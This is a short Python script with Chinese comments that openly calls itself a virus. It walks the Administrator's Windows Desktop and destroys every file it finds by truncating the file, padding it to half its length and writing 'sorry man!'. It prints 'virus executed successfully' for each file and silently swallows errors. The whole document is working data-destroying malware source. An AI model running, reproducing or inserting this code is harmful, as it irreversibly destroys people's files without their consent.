# -*- coding: utf-8 -*-
import os


# 查找路径
def getadllfilepath(rootdir):
    #更新
    list = os.listdir(rootdir)#该目录下的所有文件名
    list2 = []#存放路径+文件名
    for p in range(0,len(list)):#遍历list的文件名
        path = os.path.join(rootdir, list[p])#字符串拼接成绝对路径
        list2.append(path)#放到list2列表中
    return list2
# 使用二进制进行半执行破坏
def broken(filepath):
    f = open(filepath, "rb")
    content = f.read()
    length = 1 / 2 * len(content)
    f.close()
    f = open(filepath, "wb")
    f.seek(int(length))
    f.write("sorry man!".encode())
    f.close()
# 破坏路径
rootdirs = [r"C:\Users\Administrator\Desktop"]  # 损坏路径
try:
    for rootdir in rootdirs:
        for file in getadllfilepath(rootdir):
            broken(file)
            print('病毒执行成功')
except:
    pass
